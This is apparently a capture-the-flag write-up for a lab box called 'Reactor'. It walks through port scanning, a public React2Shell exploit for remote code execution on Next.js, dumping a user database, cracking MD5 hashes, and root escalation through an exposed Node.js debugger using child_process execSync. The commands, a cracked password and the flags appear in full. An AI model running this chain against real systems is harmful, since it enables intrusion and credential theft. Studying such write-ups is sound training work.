## Enumeration

### Port Scanning

```jsx
theblue@blue:~/htb/Reactor$ sudo nmap -sC -sV -A --min-rate 1000 -T4 -oN nmap 10.129.200.211 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-26 06:26 UTC
Nmap scan report for 10.129.200.211
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 26 May 2026 06:27:25 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 26 May 2026 06:27:25 GMT
|     Connection: close
|   Help, NCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

From this, i assume that two port and one is ssh and another one is Nextjs because with `Next-Router-State-Tree` used for  an internal mechanism used by Next.js (specifically in the App Router) to keep the client-side routing state in sync with the server. 

### Exploitation

It is a NextJs application so i have a idea to check React2Shell vulnerability to find those things.

https://github.com/xalgord/React2Shell

```jsx
theblue@blue:~/htb/Reactor/exploit/React2Shell$ python3 react2shell.py -u http://10.129.200.211:3000
╔════════════════════════════════════════════════════════════╗
║              React2Shell - Next.js RCE Shell               ║
║  Target: http://10.129.200.211:3000                        ║
║  Root Mode: OFF                                            ║
║  Type: Standalone (No Dependencies)                        ║
╚════════════════════════════════════════════════════════════╝

Commands:
  .root     - Toggle root mode (sudo -i)
  .save     - Save output to file
  .download - Download file from target
  .exit     - Exit shell
  .help     - Show this help

[*] Initializing shell...
ubuntu@target:/opt/reactor-app$ whoami
node
```

Oh it works anyway, so i search or enumerate the shell to find future information. 

```jsx
ubuntu@target:/opt/reactor-app$ .download reactor.db
[*] Downloading reactor.db (via base64)...
[+] Downloaded to: /home/theblue/htb/Reactor/exploit/React2Shell/downloaded/reactor.db
[+] Size: 12288 bytes
ubuntu@target:/opt/reactor-app$ .exit

[+] Shell session ended
theblue@blue:~/htb/Reactor/exploit/React2Shell$ ls
README.md  downloaded  react2shell.py
theblue@blue:~/htb/Reactor/exploit/React2Shell$ cd downloaded/
theblue@blue:~/htb/Reactor/exploit/React2Shell/downloaded$ ls
reactor.db
```

### Post Exploitation

From this .db file, i used sqlite3 to find the user details to find the user name and password

```jsx
theblue@blue:~/htb/Reactor/exploit/React2Shell/downloaded$ sqlite3 reactor.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
sensor_logs  users
sqlite> select * from users
   ...> ;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
sqlite> .exit
```

From decode the hash (MD5) from both hash

```jsx
engineer:39d97110eafe2a9a68639812cd271e8e:reactor1
admin:
```

Then with i ssh to the server and find the user flag.

```jsx
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
engineer@reactor:~$ cat user.txt
f40efa76f0b66721f1015b34a6d5bb7f
engineer@reactor:~$
```

### Privilege Escalation Root Enumeration

After trying all the things for Privilege Escalation and finally go with internal port discovery find that one port 9229 which was node inspecter used to inspect those things.

Port 9229 is the default port for the Node.js Inspector, which allows you to attach external debugging tools to a running Node.js process.

https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html

https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse

```jsx
engineer@reactor:~$ ss -tlnp
State         Recv-Q        Send-Q               Local Address:Port               Peer Address:Port       Process
LISTEN        0             4096                    127.0.0.54:53                      0.0.0.0:*
LISTEN        0             4096                       0.0.0.0:22                      0.0.0.0:*
LISTEN        0             4096                 127.0.0.53%lo:53                      0.0.0.0:*
***LISTEN        0             511                      127.0.0.1:9229                    0.0.0.0:****
LISTEN        0             4096                          [::]:22                         [::]:*
LISTEN        0             511                              *:3000                          *:*
```

Try the inspect command in node cmd.

```jsx
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug>
```

Then from the page using child_process module we can execute the command to read the flag

```jsx
debug> exec("process.mainModule.require('child_process').exec('cat /root/root.txt')")
{ _events: Object,
  _eventsCount: 2,
  _maxListeners: 'undefined',
  _closesNeeded: 3,
  _closesGot: 0,
  ... }
debug> exec("process.mainModule.require('child_process').exec('ls')")
{ _events: Object,
  _eventsCount: 2,
  _maxListeners: 'undefined',
  _closesNeeded: 3,
  _closesGot: 0,
  ... }
```

It was error so trying to fix child_process.exec() is asynchronous, so in the Node inspector REPL you only see the returned ChildProcess object, not the command output.

```jsx
debug> exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
'c882883b419e39f7bf96ea1ad8cbdd67\n'
```
---